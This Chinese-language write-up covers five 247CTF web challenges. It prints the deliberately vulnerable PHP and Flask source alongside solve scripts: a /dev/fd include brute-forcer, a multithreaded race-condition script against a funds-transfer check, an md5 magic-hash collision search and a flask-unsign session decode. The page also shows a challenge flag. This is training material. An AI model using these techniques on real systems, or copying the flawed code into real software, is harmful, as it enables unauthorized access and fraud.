[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01634ce8f8481f1015.png)



## FORGOTTEN FILE POINTER——Medium

### <a class="reference-link" name="%E8%80%83%E7%82%B9"></a>考点
- 文件包含Linux文件描述符
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

We have opened the flag, but forgot to read and print it. Can you access it anyway?

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

很经典的文件包含题目

在Linux中，所有东西都是文件。用`fopen`函数打开`/tmp/flag.txt`，这时候会新建一个文件描述符指向`/tmp/flag.txt`。Linux下`/dev/fd`目录是记录用户打开的文件描述符，一般0代表标准输入，1代表标准输出。

题目长度限制不超过10，`/dev/fd/`总共是8位，那文件描述符的范围就是0-99，写个脚本爆破就可以了，最终flag在`/dev/fd/10`

题目名字也说了，被忘记的文件指针

```
&lt;?php
  $fp = fopen("/tmp/flag.txt", "r");
  if($_SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; isset($_GET['include']) &amp;&amp; strlen($_GET['include']) &lt;= 10) `{`
    include($_GET['include']);
  `}`
  fclose($fp);
  echo highlight_file(__FILE__, true);
?&gt;
```

```
import requests

url = 'https://510c4020b266c259.247ctf.com/'

for i in range(0,100):
    payload = f'?include=/dev/fd/`{`i`}`'
    print(url+payload)
    r = requests.get(url+payload)
    print(r.text)
```



## ACID FLAG BANK——Easy

### <a class="reference-link" name="%E8%80%83%E7%82%B9"></a>考点
- PHP代码审计
- 条件竞争代码审计
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

You can purchase a flag directly from the ACID flag bank, however there aren’t enough funds in the entire bank to complete that transaction! Can you identify any vulnerabilities within the ACID flag bank which enable you to increase the total available funds?

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

首先给了`ChallDB`类，有一个`__construct`函数，初始化pdo和flag，其他的函数先不看。紧接着new一个`ChallDB`的实例化对象

```
class ChallDB
`{`
    public function __construct($flag)
    `{`
        $this-&gt;pdo = new SQLite3('/tmp/users.db');
        $this-&gt;flag = $flag;
    `}`
`}`
$db = new challDB($flag);
```

下面来到输入数据的部分

如果GET参数`dump`，会执行`dumpUsers`函数，输出所有用户的信息

```
public function dumpUsers()
    `{`
        $result = $this-&gt;pdo-&gt;query("select id, funds from users");
        echo "&lt;pre&gt;";
        echo "ID FUNDS\n";
        while ($row = $result-&gt;fetchArray(SQLITE3_ASSOC)) `{`
            echo "`{`$row['id']`}`  `{`$row['funds']`}`\n";
        `}`
        echo "&lt;/pre&gt;";
    `}`
```

[![](https://p1.ssl.qhimg.com/t017e70e930aa39017d.png)](https://p1.ssl.qhimg.com/t017e70e930aa39017d.png)

如果GET参数`reset`，会执行`resetFunds`函数，将用户的信息重置

```
public function resetFunds()
    `{`
        $this-&gt;updateFunds(1, 247);
        $this-&gt;updateFunds(2, 0);
        return "Funds updated!";
    `}`

    public function updateFunds($id, $funds)
    `{`
        $stmt = $this-&gt;pdo-&gt;prepare('update users set funds = :funds where id = :id');
        $stmt-&gt;bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt-&gt;bindValue(':funds', $funds, SQLITE3_INTEGER);
        return $stmt-&gt;execute();
    `}`
```

如果GET参数`flag`和`from`，会先执行`clean`函数对`from`进行清洗，然后执行`buyFlag`函数购买flag

`clean`函数将传入的`from`强制转换为数字，如果是浮点数就进行四舍五入，然后赋值给`$from`

`buyFlag`函数会先检测输入的用户id是否存在，再判断它的钱够不够`247`，够的话就返回flag

```
public function clean($x)
    `{`
        return round((int)trim($x));
    `}`


    public function buyFlag($id)
    `{`
        if ($this-&gt;validUser($id) &amp;&amp; $this-&gt;getFunds($id) &gt; 247) `{`
            return $this-&gt;flag;
        `}` else `{`
            return "Insufficient funds!";
        `}`
    `}`
    public function validUser($id)
    `{`
        $stmt = $this-&gt;pdo-&gt;prepare('select count(*) as valid from users where id = :id');
        $stmt-&gt;bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt-&gt;execute();
        $row = $result-&gt;fetchArray(SQLITE3_ASSOC);
        return $row['valid'] == true;
    `}`
    public function getFunds($id)
    `{`
        $stmt = $this-&gt;pdo-&gt;prepare('select funds from users where id = :id');
        $stmt-&gt;bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt-&gt;execute();
        return $result-&gt;fetchArray(SQLITE3_ASSOC)['funds'];
    `}`
```

如果GET参数`to`、`from`和`amount`，先执行`clean`函数对三个参数进行清洗，然后让`from`的用户金币减少`amount`个，让`to`的用户增加`amount`个，且`from`用户的金币要大于等于`amount`个。这个就相当于`from`从`to`那里买了价值`amount`的东西

```
$to = $db-&gt;clean($_GET['to']);
    $from = $db-&gt;clean($_GET['from']);
    $amount = $db-&gt;clean($_GET['amount']);
    if ($to !== $from &amp;&amp; $amount &gt; 0 &amp;&amp; $amount &lt;= 247 &amp;&amp; $db-&gt;validUser($to) &amp;&amp; $db-&gt;validUser($from) &amp;&amp; $db-&gt;getFunds($from) &gt;= $amount) `{`
        $db-&gt;updateFunds($from, $db-&gt;getFunds($from) - $amount);
        $db-&gt;updateFunds($to, $db-&gt;getFunds($to) + $amount);
        echo "Funds transferred!";
    `}` else `{`
        echo "Invalid transfer request!";
    `}`
```

这里check表面上看没什么问题，但是如果

1给2打钱和2给1打钱，同时在`$db-&gt;getFunds($from) &gt;= $amount`这个check前发生，那不就可以绕过这个check实现打钱，也就是条件竞争。这里有写好的工具：[https://github.com/TheHackerDev/race-the-web](https://github.com/TheHackerDev/race-the-web)

设置两个`requests`，参数分别填写`?to=1&amp;from=2&amp;amount=1`和`?to=2&amp;from=1&amp;amount=1`，再添加自己的cookie，最后启动工具跑就行了。跑完看一下`?dump`是否如下满足条件（任一用户金币大于247），满足的话就直接购买即可`?flag&amp;from=1`

[![](https://p2.ssl.qhimg.com/t01638dad1c301814bb.png)](https://p2.ssl.qhimg.com/t01638dad1c301814bb.png)

[![](https://p1.ssl.qhimg.com/t0182903583e0fd4a6a.png)](https://p1.ssl.qhimg.com/t0182903583e0fd4a6a.png)

### <a class="reference-link" name="%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%96%B9%E6%B3%95"></a>条件竞争方法
- [https://github.com/TheHackerDev/race-the-web](https://github.com/TheHackerDev/race-the-web)
- 自己写脚本(这个有问题)
```
#coding=utf-8 
import io
import requests
import threading

header = `{`
    'Cookie' : "_ga=GA1.2.1547995919.1611847143; __stripe_mid=32932a70-ec67-4b18-b1dc-af3638f802ab3ee642"
`}`
f = open('res.txt','w')

def check(session):
    while True:
        url1 = "https://54127da6b7dbd39f.247ctf.com/?dump"
        res = session.get(url1,headers=header)
        if ('1 0' in res.text) and ('2 0' in res.text):
            url1 = "https://54127da6b7dbd39f.247ctf.com/?reset"
            res = session.get(url1,headers=header)

def From1to2(session):
    while True:
        url1 = "https://54127da6b7dbd39f.247ctf.com/?to=2&amp;from=1&amp;amount=1"
        res = session.get(url1,headers=header)
        print(res.text.strip())

def From2to1(session):
    while True:
        url2 = "https://54127da6b7dbd39f.247ctf.com/?to=1&amp;from=2&amp;amount=1"
        res = session.get(url2,headers=header)
        print(res.text.strip())

def getFlag(session):
    while True:
        url1_flag = "https://54127da6b7dbd39f.247ctf.com/?flag&amp;from=1"
        url2_flag = 'https://54127da6b7dbd39f.247ctf.com/?flag&amp;from=2'
        res_1 = session.get(url1_flag,headers=header)
        res_2 = session.get(url2_flag,headers=header)
        if ('CTF' in res_1.text) or ('CTF' in res_2.text):
            f.write(res_1.text)
            f.write(res_2.text)
            f.close()
            exit()

if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30): 
            threading.Thread(target=From1to2,args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=From2to1,args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=getFlag,args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=check,args=(session,)).start()
    event.set()
```

### <a class="reference-link" name="%E5%85%A8%E9%83%A8%E4%BB%A3%E7%A0%81"></a>全部代码

```
&lt;?php
require_once('flag.php');

class ChallDB
`{`
    public function __construct($flag)
    `{`
        $this-&gt;pdo = new SQLite3('/tmp/users.db');
        $this-&gt;flag = $flag;
    `}`

    public function updateFunds($id, $funds)
    `{`
        $stmt = $this-&gt;pdo-&gt;prepare('update users set funds = :funds where id = :id');
        $stmt-&gt;bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt-&gt;bindValue(':funds', $funds, SQLITE3_INTEGER);
        return $stmt-&gt;execute();
    `}`

    public function resetFunds()
    `{`
        $this-&gt;updateFunds(1, 247);
        $this-&gt;updateFunds(2, 0);
        return "Funds updated!";
    `}`

    public function getFunds($id)
    `{`
        $stmt = $this-&gt;pdo-&gt;prepare('select funds from users where id = :id');
        $stmt-&gt;bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt-&gt;execute();
        return $result-&gt;fetchArray(SQLITE3_ASSOC)['funds'];
    `}`

    public function validUser($id)
    `{`
        $stmt = $this-&gt;pdo-&gt;prepare('select count(*) as valid from users where id = :id');
        $stmt-&gt;bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt-&gt;execute();
        $row = $result-&gt;fetchArray(SQLITE3_ASSOC);
        return $row['valid'] == true;
    `}`

    public function dumpUsers()
    `{`
        $result = $this-&gt;pdo-&gt;query("select id, funds from users");
        echo "&lt;pre&gt;";
        echo "ID FUNDS\n";
        while ($row = $result-&gt;fetchArray(SQLITE3_ASSOC)) `{`
            echo "`{`$row['id']`}`  `{`$row['funds']`}`\n";
        `}`
        echo "&lt;/pre&gt;";
    `}`

    public function buyFlag($id)
    `{`
        if ($this-&gt;validUser($id) &amp;&amp; $this-&gt;getFunds($id) &gt; 247) `{`
            return $this-&gt;flag;
        `}` else `{`
            return "Insufficient funds!";
        `}`
    `}`

    public function clean($x)
    `{`
        return round((int)trim($x));
    `}`
`}`

$db = new challDB($flag);
if (isset($_GET['dump'])) `{`
    $db-&gt;dumpUsers();
`}` elseif (isset($_GET['reset'])) `{`
    echo $db-&gt;resetFunds();
`}` elseif (isset($_GET['flag'], $_GET['from'])) `{`
    $from = $db-&gt;clean($_GET['from']);
    echo $db-&gt;buyFlag($from);
`}` elseif (isset($_GET['to'],$_GET['from'],$_GET['amount'])) `{`
    $to = $db-&gt;clean($_GET['to']);
    $from = $db-&gt;clean($_GET['from']);
    $amount = $db-&gt;clean($_GET['amount']);
    if ($to !== $from &amp;&amp; $amount &gt; 0 &amp;&amp; $amount &lt;= 247 &amp;&amp; $db-&gt;validUser($to) &amp;&amp; $db-&gt;validUser($from) &amp;&amp; $db-&gt;getFunds($from) &gt;= $amount) `{`
        $db-&gt;updateFunds($from, $db-&gt;getFunds($from) - $amount);
        $db-&gt;updateFunds($to, $db-&gt;getFunds($to) + $amount);
        echo "Funds transferred!";
    `}` else `{`
        echo "Invalid transfer request!";
    `}`
`}` else `{`
    echo highlight_file(__FILE__, true);
`}`
```



## COMPARE THE PAIR——Easy

### <a class="reference-link" name="%E8%80%83%E7%82%B9"></a>考点
- PHP md5()弱比较
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

经典弱比较，PHP中两个`以0e为开头的数字`的字符串会被认为是科学计数法，找个字符串加盐之后md5是0e开头并且0e之后全为数字即可

```
&lt;?php
  require_once('flag.php');
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) &amp;&amp; md5($salt . $_GET['password']) == $password_hash)`{`
    echo $flag;
  `}`
  echo highlight_file(__FILE__, true);
?&gt;
```

用python多线程跑一下

```
import hashlib
import threading

salt = "f789bbc328a3d1a3"

def collision(start):
    for i in range(start, start+1000000):
        m = hashlib.md5()
        s = salt + str(i)
        m.update(s.encode())
        r = m.hexdigest()
        if r.startswith("0e") and r[2:].isdigit():
            print(str(i)+ '=&gt;' + s + '=&gt;' + r)
ths = []
for i in range(1000):
    tmp = i*1000000
    t = threading.Thread(target=collision, args=(tmp,))
    ths.append(t)

for i in ths:
    i.start()
# 237701818=&gt;f789bbc328a3d1a3237701818=&gt;0e668271403484922599527929534016
```

[![](https://p1.ssl.qhimg.com/t014dee6e4d0149daa2.png)](https://p1.ssl.qhimg.com/t014dee6e4d0149daa2.png)

主要是这个点
- 在PHP中，以`数字+e`开头，后面全是数字的字符串和数字比较时，会被认为是科学计数法，例如`0e`被识别成0


## SECURED SESSION——Easy考点
- Flask session解码
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

If you can guess our random secret key, we will tell you the flag securely stored in your session.

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

先是对Flask的初始化，然后设置`SECRET_KEY`是长度24的随机字符串

```
import os
from flask import Flask, request, session
from flag import flag

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
```

访问`/`返回代码，访问`/flag`则是给出flag，可以看到给出flag的前提是要GET正确的`secret_key`

```
@app.route("/flag")
def index():
    secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
    session['flag'] = flag
    if secret_key == app.config['SECRET_KEY']:
      return session['flag']
    else:
      return "Incorrect secret key!"
```

在访问`/`对应的逻辑中，是没有对session的操作的，所以访问`/`是不会看到cookie的。先访问`/flag`就可以看到cookie，再用`flask-unsign`就可以解密session

这里我的cookie是`session=eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.YBv1UQ.izmpPGtF3K1e9vZR6hYJRfMjRAU; HttpOnly; Path=/`

直接解码

```
flask-unsign --decode --cookie eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.YBv1UQ.i zmpPGtF3K1e9vZR6hYJRfMjRAU
`{`'flag': b'247CTF`{`da80795f8a5cab2e037d7385807b9a91`}`'`}`
```

### <a class="reference-link" name="%E5%85%A8%E9%83%A8%E4%BB%A3%E7%A0%81"></a>全部代码

```
import os
from flask import Flask, request, session
from flag import flag

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

def secret_key_to_int(s):
    try:
        secret_key = int(s)
    except ValueError:
        secret_key = 0
    return secret_key

@app.route("/flag")
def index():
    secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
    session['flag'] = flag
    if secret_key == app.config['SECRET_KEY']:
      return session['flag']
    else:
      return "Incorrect secret key!"

@app.route('/')
def source():
    return "
%s
" % open(__file__).read()

if __name__ == "__main__":
    app.run()
```



## TRUSTED CLIENT——Easy

### <a class="reference-link" name="%E8%80%83%E7%82%B9"></a>考点
- JSFuck
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

Developers don’t always have time to setup a backend service when prototyping code. Storing credentials on the client side should be fine as long as it’s obfuscated right?

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

根据题目可以看出来这是把登陆凭证存储在客户端，但是在请求头和返回头中并没有发现什么有用的信息，倒是有一段JSFuck。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01458de7c9f4578004.png)

把JSFuck复制出来直接解码就可以了，不过这里是个函数，就不要复制最后面的`()`了

[![](https://p0.ssl.qhimg.com/t0136ca8fe2755f4cd1.png)](https://p0.ssl.qhimg.com/t0136ca8fe2755f4cd1.png)



## 参考
- [https://gusralph.info/exploiting-xss-for-sqli/](https://gusralph.info/exploiting-xss-for-sqli/)
- [https://snyk.io/research/zip-slip-vulnerability](https://snyk.io/research/zip-slip-vulnerability)
- [https://stackoverflow.com/questions/50849406/how-to-create-a-file-to-test-zip-slip-vulnerability-from-commandline](https://stackoverflow.com/questions/50849406/how-to-create-a-file-to-test-zip-slip-vulnerability-from-commandline)